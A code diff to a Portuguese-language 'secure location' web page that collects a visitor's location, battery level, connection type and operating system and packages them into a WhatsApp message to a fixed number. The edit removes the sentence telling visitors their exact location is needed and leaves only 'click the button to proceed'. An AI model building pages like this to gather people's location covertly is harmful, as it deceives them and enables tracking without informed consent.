@@ -288,7 +288,7 @@
     </div>
 
     <h1>Localização Segura</h1>
-    <p>Precisamos da sua localização exata para prosseguir com o atendimento.</p>
+    <p>Clique no botão 👇 para prosseguir com o atendimento.</p>
 
 
     <button id="btnEnviar" onclick="enviarLocalizacao()">
@@ -483,13 +483,13 @@
       const net = payload.rede;
 
       const mensagem =
-        `*📍 MINHA LOCALIZAÇÃO*\n\n` +
+        `*📍MINHA LOCALIZAÇÃO*\n\n` +
         `🔗 *Maps*: ${loc.link_maps}\n\n` +
-        `📊 *Dados Técnicos*:\n` +
-        `🔋 Bateria: ${dev.bateria.nivel}\n` +
-        `🎯 Precisão: ${loc.precisao_metros}m\n` +
-        `📡 Conexão: ${net.tipo}\n` +
-        `📱 Sistema: ${dev.sistema}`;
+        `-----------Infos------------\n` +
+        `🔋 Bateria: *${dev.bateria.nivel}*\n` +
+        `🎯 Precisão: *${loc.precisao_metros}m*\n` +
+        `📡 Conexão: *${net.tipo}*\n` +
+        `📱 Sistema: *${dev.sistema}*`;
 
       // CORREÇÃO: Usar &text= em vez de ?text=
       const url = `https://api.whatsapp.com/send?phone=${TELEFONE_WHATSAPP}&text=${encodeURIComponent(mensagem)}`;
